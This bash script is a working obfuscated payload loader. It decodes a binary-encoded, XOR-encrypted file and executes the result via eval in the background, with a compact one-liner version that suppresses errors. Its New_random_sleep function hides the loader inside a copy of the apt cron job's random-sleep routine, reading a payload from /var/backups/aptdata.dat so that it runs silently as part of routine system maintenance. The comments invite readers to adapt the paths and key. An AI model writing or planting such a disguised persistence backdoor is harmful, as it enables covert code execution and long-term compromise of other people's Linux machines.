#!/bin/bash

deobfBd() {
    # Get the contents of the binary file, which is the payload.
    Binary="$(cat "${1}")"

    # The XOR key used to encrypt the payload.
    # If "${2}" is empty, or has a value less than 1, then use the default vaolume of 42 for the XOR key. Otherwise, use the value of "${2}" as the XOR key.
    if [[ -z "${2}" ]] || [[ "${2}" -lt 1 ]]; then
        local xorKey=42
    else
        local xorKey="${2}"
    fi

    # Colors for output
    RED='\033[0;31m'
    NC='\033[0m' # No Color

    # XOR function using a bitwise XOR operation.
    xor(){
        xorKey="$1"
        shift
        R=""
        for i in $@; do
            # Xor the decimal with the XOR key. Bitwise XOR operation.
            R="$R "$(($i^$xorKey))""
        done
        # Return the result.
        echo "$R"
    }

    # Output the binary to show the contents of the binary file.
    printf "${RED}Binary:${NC} ${Binary}\n"

    # Convert the binary to Xor-ed decimal.
    XorDecimal="$(for a in ${Binary} ; do printf "%x" $((2#$a)); done | xxd -r -p)"
    printf "${RED}XOR Decimal:${NC} ${XorDecimal}\n"

    # Convert the Xor-ed decimal to decimal.
    Decimal="$(xor ${xorKey} "${XorDecimal}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
    printf "${RED}Decimal:${NC} ${Decimal}\n"

    # Convert the decimal to charcode.
    Charcode="$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<"${Decimal}")"
    printf "${RED}Charcode:${NC} ${Charcode}\n"

    # Convert the charcode to hex.
    Hex="$(sed 's/;/\n/g' <<<"${Charcode}" | sed '/^$/d' | sed 's/^0x//g' | xargs -I{} printf "\\x{}")"
    printf "${RED}Hex:${NC}";echo "${Hex}"

    # Convert the hex to plain text. This is not needed, only here for demonstration purposes. Eval can read the hex code as a string and execute it as a command.
    PlainText="$(echo -e "${Hex}")"
    printf "${RED}PlainText:${NC} ${PlainText}\n"

    # Run the hex code as a command. This will execute the payload. Eval can read the hex code as a string and execute it as a command. The "&" at the end of the command will run the command in the background.
    eval $"$(echo -e "${Hex}")" &
}

# This function is a slimmed down version of the above function. It does not include the intermediate steps.
deobfBdSlim() {
    x(){ K=$1;shift;R="";for i in $@; do R="$R $(($i^$K))";done;echo "$R";}
    eval $"$(echo -e "$(sed 's/;/\n/g' <<<"$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<\
    "$(x "${2}" "$(for a in $(cat "${1}");do printf "%x" $((2#$a));done|xxd -r -p)"\
    |sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')")"|sed '/^$/d'|sed 's/^0x//g'|xargs -I{} printf "\\x{}")")" 2>/dev/nul &
}


# randon sleep function copied from the deafult apt periodic script found in /etc/cron.daily/apt-compat
random_sleep()
{
    RandomSleep=1800
    eval $(apt-config shell RandomSleep APT::Periodic::RandomSleep)
    if [ $RandomSleep -eq 0 ]; then
        return
    fi
    if [ -z "$RANDOM" ] ; then
        # A fix for shells that do not have this bash feature.
        RANDOM=$(( $(dd if=/dev/urandom bs=2 count=1 2> /dev/null | cksum | cut -d' ' -f1) % 32767 ))
    fi
    TIME=$(($RANDOM % $RandomSleep))
    sleep $TIME
}


# My version of the random sleep function with the embedded deobfBdSlim function.
# Note: the data.dat file location and the Xor key is hard coded in the function. You will need to change the location of the data.dat file and the Xor key to match your needs.
New_random_sleep()
{
    RandomSleep=1800
    x() { K=$1; shift; R=""; for i in $@; do R="$R $(($i^$K))"; done; echo "$R"; }
    eval $(apt-config shell RandomSleep APT::Periodic::RandomSleep)
    eval $"$(echo -e "$(sed 's/;/\n/g' <<<"$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<\
    "$(x 42 "$(for a in $(cat /var/backups/aptdata.dat);do printf "%x" $((2#$a));done|xxd -r -p)"|\
    sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')")"|sed '/^$/d'|sed 's/^0x//g'|\
    xargs -I{} printf "\\x{}")")" 2>/dev/null &
    if [ $RandomSleep -eq 0 ]; then
        return
    fi
    if [ -z "$RANDOM" ] ; then
        # A fix for shells that do not have this bash feature.
        RANDOM=$(( $(dd if=/dev/urandom bs=2 count=1 2> /dev/null | cksum | cut -d' ' -f1) % 32767 ))
    fi
    TIME=$(($RANDOM % $RandomSleep))
    # sleep $TIME
}

# Run the function with the binary file as the first argument, and the XOR key as the second argument.
deobfBd "${1}" "42"

# Run the slimmed down function with the binary file as the first argument, and the XOR key as the second argument.
deobfBdSlim "${1}" "42"